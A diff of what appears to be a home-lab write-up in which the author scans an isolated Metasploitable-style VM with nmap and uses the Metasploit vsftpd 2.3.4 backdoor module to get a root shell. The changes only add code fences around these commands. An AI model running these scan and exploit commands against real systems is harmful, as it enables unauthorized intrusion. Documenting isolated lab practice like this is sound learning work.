@@ -18,7 +18,9 @@ target has no internet access and stays isolated from my home network.
 
 <img width="1026" height="586" alt="Scanned_The_Target" src="https://github.com/user-attachments/assets/859a9c6b-ecb3-4ec7-9604-4da134a36b7b" />
 
+```
 nmap -sV 192.168.56.102
+```
 
 This found 23 open ports running old, vulnerable services, including
 vsftpd 2.3.4 on port 21, which has a known backdoor.
@@ -27,9 +29,11 @@ vsftpd 2.3.4 on port 21, which has a known backdoor.
 
 <img width="922" height="886" alt="Root_Shell" src="https://github.com/user-attachments/assets/3e1cde6f-ad2e-41d2-8b64-9f96094eac9f" />
 
+```
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.102
 run
+```
 
 The exploit worked and gave me a root shell. Running `id` returned
 `uid=0(root)` — full control of the machine.
